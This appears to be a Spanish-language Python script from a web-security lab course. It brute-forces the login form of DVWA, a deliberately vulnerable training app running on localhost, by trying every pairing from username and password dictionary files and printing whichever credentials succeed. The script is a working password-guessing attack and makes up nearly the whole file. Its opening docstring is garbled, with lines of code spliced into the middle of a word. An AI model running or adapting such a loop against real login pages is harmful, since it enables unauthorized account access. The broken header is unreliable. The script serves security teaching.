#!/usr/bin/env python3
"""
Herramie    print(f"[*] Objetivo: {url_objetivo}")
    print(f"[*] Usuarios en diccionario: {len(lista_usuarios)}")
    print(f"[*] Passwords en diccionario: {len(lista_passwords)}")
    print(f"[*] Combinaciones totales: {len(lista_usuarios) * len(lista_passwords)}")
    print(f"[*] ID de sesión: {configuracion_cookies['PHPSESSID'][:25]}...")
    print("\n[*] Iniciando pruebas de acceso...\n") prueba de credenciales para DVWA
Laboratorio 2 - Seguridad en Aplicaciones Web
Autor: Matías
"""

import requests
import time

def cargar_diccionario(nombre_archivo):
    """Lee archivo de diccionario y devuelve lista limpia"""
    with open(nombre_archivo, 'r') as archivo:
        return [elemento.strip() for elemento in archivo.readlines()]

def ejecutar_prueba_credenciales():
    """Realiza prueba de combinaciones usuario/contraseña en DVWA"""
    
    # URL del formulario vulnerable
    url_objetivo = "http://localhost:4280/vulnerabilities/brute/"
    
    # Configuración de sesión (obtener de navegador)
    # Pasos: navegar a DVWA → login → F12 → cookies → copiar PHPSESSID
    configuracion_cookies = {
        'PHPSESSID': '5228e2263c946eca310527db83f311ac',
        'security': 'low'
    }
    
    # Cargar archivos de prueba
    lista_usuarios = cargar_diccionario('usernames.txt')
    lista_passwords = cargar_diccionario('passwords.txt')
    
    print("╔" + "═" * 68 + "╗")
    print("║" + " PRUEBA DE CREDENCIALES - DVWA BRUTE FORCE ".center(68) + "║")
    print("╚" + "═" * 68 + "╝")
    print(f"\n→ Objetivo: {url_objetivo}")
    print(f"→ Usuarios en diccionario: {len(lista_usuarios)}")
    print(f"→ Passwords en diccionario: {len(lista_passwords)}")
    print(f"→ Combinaciones totales: {len(lista_usuarios) * len(lista_passwords)}")
    print(f"→ ID de sesión: {configuracion_cookies['PHPSESSID'][:25]}...")
    print("\n⚡ Iniciando pruebas de acceso...\n")
    print("─" * 70)
    
    accesos_exitosos = []
    contador_pruebas = 0
    momento_inicio = time.time()
    
    for usuario in lista_usuarios:
        for password in lista_passwords:
            contador_pruebas += 1
            
            # Preparar datos para petición
            datos_formulario = {
                'username': usuario,
                'password': password,
                'Login': 'Login'
            }
            
            try:
                # Enviar petición HTTP
                respuesta = requests.get(url_objetivo, params=datos_formulario, cookies=configuracion_cookies)
                
                # Analizar respuesta del servidor
                if "Welcome to the password protected area" in respuesta.text:
                    accesos_exitosos.append((usuario, password))
                    print(f"[+] Acceso conseguido: {usuario}:{password}")
                elif "Username and/or password incorrect" in respuesta.text:
                    print(f"[-] Prueba #{contador_pruebas:03d}: {usuario}:{password} (rechazado)")
                else:
                    print(f"[?] Prueba #{contador_pruebas:03d}: {usuario}:{password} (respuesta no esperada)")
                
            except requests.RequestException as error:
                print(f"[!] Error de conexión: {error}")
            
            # Pausa breve entre intentos
            time.sleep(0.05)
    
    momento_fin = time.time()
    duracion = momento_fin - momento_inicio
    
    # Resumen de resultados
    print("\n" + "╔" + "═" * 68 + "╗")
    print("║" + " RESUMEN DE RESULTADOS ".center(68) + "║")
    print("╚" + "═" * 68 + "╝")
    print(f"[*] Duración total: {duracion:.2f} segundos")
    print(f"[*] Pruebas ejecutadas: {contador_pruebas}")
    print(f"[*] Velocidad: {contador_pruebas/duracion:.2f} pruebas/segundo")
    print(f"[*] Accesos válidos: {len(accesos_exitosos)}")
    
    if accesos_exitosos:
        print("\n[+] CREDENCIALES VÁLIDAS ENCONTRADAS:")
        for user, pwd in accesos_exitosos:
            print(f"    >> {user} : {pwd}")
    else:
        print("\n[-] No se encontraron credenciales válidas")
    
    print("\n" + "═" * 70)
    
    return accesos_exitosos, duracion, contador_pruebas

if __name__ == "__main__":
    print("\n[i] NOTA: Verifica que el PHPSESSID esté actualizado\n")
    
    try:
        ejecutar_prueba_credenciales()
    except FileNotFoundError as error:
        print(f"\n[!] Error: No se encontró el archivo - {error}")
        print("[!] Verifica que existan los archivos usernames.txt y passwords.txt")
    except KeyboardInterrupt:
        print("\n\n[!] Proceso cancelado por el usuario")
